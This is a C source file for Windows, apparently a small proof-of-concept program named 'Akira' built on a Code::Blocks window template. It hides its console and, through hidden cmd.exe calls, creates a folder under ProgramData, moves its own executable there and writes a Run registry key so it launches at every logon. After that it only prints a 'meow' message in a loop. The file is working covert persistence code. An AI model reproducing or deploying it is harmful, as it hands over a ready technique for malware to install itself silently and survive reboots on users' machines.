#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <tchar.h>
#include <windows.h>
#include <Shlwapi.h>
#include <stdio.h>

/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

/*  Make the class name into a global variable  */
TCHAR szClassName[ ] = _T("Akira");


char v_binary_path[MAX_PATH] = "C:\\Programdata\\Aki\\";

char v_binary_name[MAX_PATH];

char v_path[] = "/C mkdir %ProgramData%\\Aki";

char v_cbi[MAX_PATH];

char v_ibi[500];

void f_prepare_bite()
{
    char v_current_path[MAX_PATH];
    GetModuleFileNameA(nullptr, v_current_path, MAX_PATH);
    strncpy(v_binary_name, (PathFindFileNameA(v_current_path)), MAX_PATH);

    strcat(v_binary_path, v_binary_name);

    sprintf(v_cbi, "/C move %s %ProgramData%\\Aki", v_binary_name);

    sprintf(v_ibi, "/C REG ADD HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v %s /t REG_SZ /d %ProgramData%\\Aki\\%s", v_binary_name, v_binary_name);

}
void f_bite()
{

    Sleep(1000);
    ShellExecute(NULL, "open", "cmd.exe", v_path, NULL, SW_HIDE);
    Sleep(1000);
    ShellExecute(NULL, "open", "cmd.exe", v_cbi, NULL, SW_HIDE);
    Sleep(1000);
    ShellExecute(NULL, "open", "cmd.exe", v_ibi, NULL, SW_HIDE);
    Sleep(1000);

}

bool f_binary_copied()
{
    int retval = PathFileExists(v_binary_path);

    if(retval == 1)
        return true;
    else
        return false;
}

bool f_is_nested_cu()
{
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);

    if(RegQueryValueEx(hKey, TEXT(v_binary_name), NULL, NULL, NULL, NULL) != ERROR_FILE_NOT_FOUND)
    {
        RegCloseKey(hKey);
        return true;
    }
    else
        return false;
}

void f_meow(){

    while(true)
    {
        printf("Akira says Meowwwwwww \n");
        Sleep(30000); //30s
    }
}

int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    HWND hwnd;               /* This is the handle for our window */
    MSG messages;            /* Here messages to the application are saved */
    WNDCLASSEX wincl;        /* Data structure for the windowclass */

    /* The Window structure */
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
    wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
    wincl.cbSize = sizeof (WNDCLASSEX);

    /* Use default icon and mouse-pointer */
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;                 /* No menu */
    wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
    wincl.cbWndExtra = 0;                      /* structure or the window instance */
    /* Use Windows's default colour as the background of the window */
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    /* Register the window class, and if it fails quit the program */
    if (!RegisterClassEx (&wincl))
        return 0;

    /* The class is registered, let's create the program*/
    hwnd = CreateWindowEx (
           0,                   /* Extended possibilites for variation */
           szClassName,         /* Classname */
           _T("Code::Blocks Template Windows App"),       /* Title Text */
           WS_OVERLAPPEDWINDOW, /* default window */
           CW_USEDEFAULT,       /* Windows decides the position */
           CW_USEDEFAULT,       /* where the window ends up on the screen */
           544,                 /* The programs width */
           375,                 /* and height in pixels */
           HWND_DESKTOP,        /* The window is a child-window to desktop */
           NULL,                /* No menu */
           hThisInstance,       /* Program Instance handler */
           NULL                 /* No Window Creation data */
           );

    /* Make the window visible on the screen */
    //ShowWindow (hwnd, nCmdShow);

    f_prepare_bite();

    if(f_is_nested_cu() && f_binary_copied())
        f_meow();
    else
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        f_bite();
        PostQuitMessage (0);
    }

    /* Run the message loop. It will run until GetMessage() returns 0 */
    while (GetMessage (&messages, NULL, 0, 0))
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }

    /* The program return-value is 0 - The value that PostQuitMessage() gave */
    return messages.wParam;
}


/*  This function is called by the Windows function DispatchMessage()  */

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  /* handle the messages */
    {
        case WM_DESTROY:
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
            break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}
